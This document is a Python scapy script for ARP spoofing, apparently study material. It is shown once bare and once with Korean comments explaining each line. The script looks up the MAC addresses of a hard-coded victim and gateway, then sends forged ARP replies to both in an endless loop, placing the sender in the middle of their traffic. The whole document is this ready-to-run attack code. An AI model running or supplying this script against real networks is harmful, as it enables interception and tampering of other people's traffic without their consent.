from scapy.all import ARP, Ether, sendp, srp
import time

interface = "eth0"
target_ip = "30.1.1.5"  # 피해자 IP
gateway_ip = "30.1.1.254"  # 라우터 IP

def get_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result = srp(arp_request, timeout=2, iface=interface, verbose=False)[0]
    return result[0][1].hwsrc if result else None

def arp_spoof():
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        print("MAC 주소를 가져오지 못했다. IP 확인 필요.")
        return

    packet1 = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    packet2 = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    print(f"ARP Spoofing 시작: {target_ip} <-> {gateway_ip}")
    try:
        while True:
            sendp(packet1, iface=interface, verbose=False)
            sendp(packet2, iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("종료")

arp_spoof()

-----------------------코드에 주석을 달아서 설명----------------------

#!/usr/bin/env python3
# 필요한 scapy 라이브러리 및 time 모듈을 가져온다.
from scapy.all import ARP, Ether, sendp, srp
import time

# --- 설정 변수 ---
# 공격을 수행할 네트워크 인터페이스 이름
interface = "eth0"
# 공격 대상(피해자)의 IP 주소
target_ip = "30.1.1.5"
# 네트워크 게이트웨이(라우터)의 IP 주소
gateway_ip = "30.1.1.254"

def get_mac(ip):
    """
    IP 주소를 입력받아 해당 IP의 MAC 주소를 알아내는 함수
    """
    # Ether()를 이용해 L2(이더넷) 프레임을 생성. dst='ff:ff:ff:ff:ff:ff'는 브로드캐스트를 의미.
    # ARP()를 이용해 ARP 요청 패킷을 생성. pdst=ip는 목적지 IP를 지정.
    # '/' 기호로 두 계층의 패킷을 하나로 합친다.
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    
    # srp() 함수로 생성한 패킷을 L2에서 보내고 응답을 받는다.
    # timeout=2: 2초간 응답이 없으면 중단.
    # iface=interface: 지정된 인터페이스로 패킷 전송.
    # verbose=False: 전송 과정을 화면에 출력하지 않음.
    # [0]은 (응답받은 패킷, 응답없는 패킷) 중 응답받은 패킷 리스트를 의미.
    result = srp(arp_request, timeout=2, iface=interface, verbose=False)[0]
    
    # 응답이 있다면, 응답 패킷(result[0][1])에서 소스 MAC 주소(hwsrc)를 반환.
    # 응답이 없으면 None을 반환.
    return result[0][1].hwsrc if result else None

def arp_spoof():
    """
    ARP 스푸핑 공격을 수행하는 메인 함수
    """
    # 공격에 앞서 피해자와 게이트웨이의 실제 MAC 주소를 얻어온다.
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    # MAC 주소를 가져오지 못하면 오류 메시지를 출력하고 종료한다.
    if not target_mac or not gateway_mac:
        print("MAC 주소를 가져오지 못했다. IP 주소 또는 네트워크 연결을 확인하라.")
        return

    # 1. 피해자에게 보낼 ARP Reply(응답) 패킷 생성
    # "나는 게이트웨이(gateway_ip)다"라고 속이는 패킷.
    # op=2: ARP 응답, psrc: 보내는 사람 IP(속일 IP), pdst: 받는 사람 IP, hwdst: 받는 사람 MAC
    packet1 = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    
    # 2. 게이트웨이에게 보낼 ARP Reply(응답) 패킷 생성
    # "나는 피해자(target_ip)다"라고 속이는 패킷.
    packet2 = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    
    print(f"ARP Spoofing 시작: {target_ip} <-> {gateway_ip}")
    
    try:
        # 무한 루프를 돌면서 ARP 캐시가 초기화되지 않도록 지속적으로 공격 패킷을 보낸다.
        while True:
            # sendp()는 L2(Ethernet) 패킷을 보내는 함수.
            sendp(packet1, iface=interface, verbose=False)
            sendp(packet2, iface=interface, verbose=False)
            # 2초간 대기. 너무 자주 보내서 네트워크에 부하를 주는 것을 방지.
            time.sleep(2)
            
    # 사용자가 Ctrl+C를 눌러 종료를 시도하면 루프를 빠져나온다.
    except KeyboardInterrupt:
        print("\nARP Spoofing 공격을 중단한다.")
        # (참고) 실제로는 여기서 원래 MAC 주소로 되돌리는 'restore' 코드가 필요하다.

# 메인 함수를 호출하여 ARP 스푸핑을 시작한다.
arp_spoof()
